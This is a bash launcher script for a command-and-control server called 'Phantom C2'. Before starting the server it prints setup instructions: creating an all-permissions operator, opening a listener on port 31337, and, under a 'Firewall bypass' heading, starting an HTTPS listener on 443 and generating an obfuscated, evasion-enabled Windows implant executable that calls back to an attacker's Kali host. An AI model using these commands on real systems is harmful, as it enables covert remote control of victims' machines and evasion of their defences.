#!/bin/bash

PHANTOM_DIR="$(cd "$(dirname "$0")/.." && pwd)"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${CYAN}[*] Starting Phantom C2 Server...${NC}"
echo ""
echo -e "${YELLOW}  ── First time setup (run in server console): ─────────────────────${NC}"
echo -e "${YELLOW}  1. new-operator --name lab --lhost <kali-ip> --permissions all${NC}"
echo -e "${YELLOW}     → copy the .cfg to ~/.phantom-client/configs/${NC}"
echo -e "${YELLOW}  2. multiplayer --lhost 0.0.0.0 --lport 31337${NC}"
echo -e "${YELLOW}     → opens port so phantom-client can connect${NC}"
echo -e "${YELLOW}  ──────────────────────────────────────────────────────────────────${NC}"
echo ""
echo -e "${YELLOW}  ── Every time (client connect + implant listener): ───────────────${NC}"
echo -e "${YELLOW}  multiplayer --lhost 0.0.0.0 --lport 31337${NC}"
echo -e "${YELLOW}  ──────────────────────────────────────────────────────────────────${NC}"
echo ""
echo -e "${GREEN}  ── Firewall bypass — use HTTPS (port 443 always open): ──────────${NC}"
echo -e "${GREEN}  https --lhost 0.0.0.0 --lport 443${NC}"
echo -e "${GREEN}  generate --https <kali-ip>:443 --os windows --arch amd64 \\${NC}"
echo -e "${GREEN}    --format exe --evasion --obfuscate --save /tmp/${NC}"
echo -e "${GREEN}  ──────────────────────────────────────────────────────────────────${NC}"
echo ""

if [ ! -f "$PHANTOM_DIR/phantom-server" ]; then
    echo -e "${RED}[!] phantom-server not found at: $PHANTOM_DIR${NC}"
    echo -e "${RED}    Run 'make' to build first.${NC}"
    exit 1
fi

cd "$PHANTOM_DIR"
exec ./phantom-server
